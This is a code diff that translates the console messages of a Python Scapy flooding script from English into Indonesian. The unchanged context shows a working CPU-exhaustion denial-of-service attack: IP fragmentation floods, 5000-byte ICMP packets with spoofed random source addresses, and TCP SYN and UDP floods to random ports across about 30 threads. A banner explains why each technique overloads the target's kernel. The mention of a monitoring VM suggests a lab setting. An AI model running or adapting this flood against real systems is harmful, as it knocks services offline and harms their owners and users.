@@ -18,25 +18,25 @@ LARGE_ICMP_PAYLOAD_SIZE = 5000     # Bytes - payload besar untuk ICMP
 MIXED_PAYLOAD_SIZE = 1400          # Bytes - untuk UDP/TCP
 
 print("=" * 70)
-print("--- CPU EXHAUSTION ATTACK ---")
+print("--- SERANGAN CPU EXHAUSTION ---")
 print("=" * 70)
 print(f"Target: {target_ip}")
-print(f"\nThread Configuration:")
-print(f"  - Fragmentation Threads: {NUM_FRAGMENTATION_THREADS} (8000-byte packets)")
-print(f"  - Large ICMP Threads: {NUM_LARGE_ICMP_THREADS} (5000-byte packets)")
-print(f"  - Mixed UDP/TCP Threads: {NUM_MIXED_FLOOD_THREADS} (random ports)")
-print(f"  - TOTAL THREADS: {NUM_FRAGMENTATION_THREADS + NUM_LARGE_ICMP_THREADS + NUM_MIXED_FLOOD_THREADS}")
-print(f"\nBatch Size: {PACKETS_PER_BATCH} packets per thread")
-print("\nWHY THIS IS MORE EFFECTIVE:")
-print("  1. IP Fragmentation forces expensive kernel reassembly operations")
-print("  2. Large payloads increase processing overhead per packet")
-print("  3. Random ports force connection table lookups and failures")
-print("  4. Mixed protocols prevent kernel fast-path optimizations")
-print("  5. 30 threads overwhelm CPU cores with concurrent processing")
-print("\nExpected Impact:")
-print("  - Target CPU usage: 30-70% (up from 0.6%)")
-print("  - Ping latency from MonitorVM: 100-500ms")
-print("  - Packet loss due to CPU exhaustion")
+print(f"\nKonfigurasi Thread:")
+print(f"  - Thread Fragmentasi: {NUM_FRAGMENTATION_THREADS} (paket 8000-byte)")
+print(f"  - Thread ICMP Besar: {NUM_LARGE_ICMP_THREADS} (paket 5000-byte)")
+print(f"  - Thread Mixed UDP/TCP: {NUM_MIXED_FLOOD_THREADS} (port random)")
+print(f"  - TOTAL THREAD: {NUM_FRAGMENTATION_THREADS + NUM_LARGE_ICMP_THREADS + NUM_MIXED_FLOOD_THREADS}")
+print(f"\nBatch Size: {PACKETS_PER_BATCH} paket per thread")
+print("\nMENGAPA LEBIH EFEKTIF:")
+print("  1. Fragmentasi IP memaksa operasi reassembly kernel yang mahal")
+print("  2. Payload besar meningkatkan overhead pemrosesan per paket")
+print("  3. Port random memaksa lookup tabel koneksi dan failure")
+print("  4. Protokol campuran mencegah optimasi fast-path kernel")
+print("  5. 30 thread membanjiri core CPU dengan pemrosesan konkuren")
+print("\nDampak yang Diharapkan:")
+print("  - Penggunaan CPU target: 30-70% (naik dari 0.6%)")
+print("  - Latency ping dari MonitorVM: 100-500ms")
+print("  - Packet loss akibat CPU exhaustion")
 print("=" * 70)
 print("\nTekan Ctrl+C untuk berhenti.\n")
 
@@ -63,7 +63,7 @@ def fragmentation_attack_thread(thread_id):
         fragments = fragment(large_packet, fragsize=800)
         packets.extend(fragments)
     
-    print(f"[FRAG Thread {thread_id}] Started - Sending fragmented packets")
+    print(f"[FRAG Thread {thread_id}] Dimulai - Mengirim paket terfragmentasi")
     
     while not stop_attack:
         try:
@@ -90,7 +90,7 @@ def large_icmp_attack_thread(thread_id):
         packet = IP(src=RandIP(), dst=target_ip) / ICMP() / payload
         packets.append(packet)
     
-    print(f"[LARGE-ICMP Thread {thread_id}] Started - Sending 5000-byte ICMP packets")
+    print(f"[LARGE-ICMP Thread {thread_id}] Dimulai - Mengirim paket ICMP 5000-byte")
     
     while not stop_attack:
         try:
@@ -125,7 +125,7 @@ def mixed_flood_attack_thread(thread_id):
                     TCP(sport=RandShort(), dport=RandShort(), flags="S")
         packets.append(packet)
     
-    print(f"[MIXED Thread {thread_id}] Started - Sending UDP/TCP to random ports")
+    print(f"[MIXED Thread {thread_id}] Dimulai - Mengirim UDP/TCP ke port random")
     
     while not stop_attack:
         try:
@@ -138,7 +138,7 @@ def mixed_flood_attack_thread(thread_id):
 try:
     threads = []
     
-    print("\nStarting attack threads...\n")
+    print("\nMemulai thread serangan...\n")
     
     # Start Fragmentation threads
     for i in range(NUM_FRAGMENTATION_THREADS):
@@ -162,10 +162,10 @@ try:
         time.sleep(0.1)
     
     print("\n" + "=" * 70)
-    print(f"ALL {len(threads)} THREADS ACTIVE - CPU EXHAUSTION ATTACK IN PROGRESS")
+    print(f"SEMUA {len(threads)} THREAD AKTIF - SERANGAN CPU EXHAUSTION BERJALAN")
     print("=" * 70)
-    print("\nMonitor the target VM's CPU usage with: top or htop")
-    print("Monitor ping latency from MonitorVM to see impact\n")
+    print("\nMonitor penggunaan CPU target VM dengan: top atau htop")
+    print("Monitor latency ping dari MonitorVM untuk melihat dampak\n")
     
     # Keep main thread alive
     while True:
@@ -173,9 +173,9 @@ try:
 
 except KeyboardInterrupt:
     print("\n\n" + "=" * 70)
-    print("--- STOPPING ATTACK ---")
+    print("--- MENGHENTIKAN SERANGAN ---")
     print("=" * 70)
     stop_attack = True
-    time.sleep(2)  # Give threads time to stop
-    print("\n--- Attack stopped successfully ---")
+    time.sleep(2)  # Beri waktu thread untuk berhenti
+    print("\n--- Serangan dihentikan dengan sukses ---")
     print("=" * 70)
